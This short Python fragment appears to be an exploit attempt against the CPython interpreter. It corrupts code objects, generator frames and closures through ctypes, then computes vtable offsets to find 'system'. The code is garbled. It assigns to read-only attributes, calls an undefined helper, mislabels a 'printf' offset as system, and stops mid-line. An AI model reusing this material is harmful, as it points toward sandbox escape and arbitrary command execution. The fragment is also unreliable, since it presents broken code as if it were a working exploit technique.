fn = lambda: None
gi = (i for i in ())
fn.__code__ = (0, 0, 0, 0, 0, 0, (), (), (),"", "", 0, "")
fn.__code__.co_consts = (None, 2)
gi.gi_frame.f_lasti = -1
fn.__closure__ = (c_void_p.in_dll(libc, '__bad_size'),)

cp = ctypes.pythonapi.PyCapsule_GetPointer.restype = ctypes.c_void_p
cp.restype = ctypes.c_void_p
cp.argtypes = [ctypes.py_object, ctypes.c_char_p]

f = cp(gi, b'gi_frame').cast('I')

#get the address of the destructor
dtor = u64(f.read(8))
#offset of the destructor in the vtable
dtor -= 0x38

#get the address of the vtable
vtable = dtor - (0x10 + 0xb8)
#offset of the printf in the vtable
system = vtable + (0x10
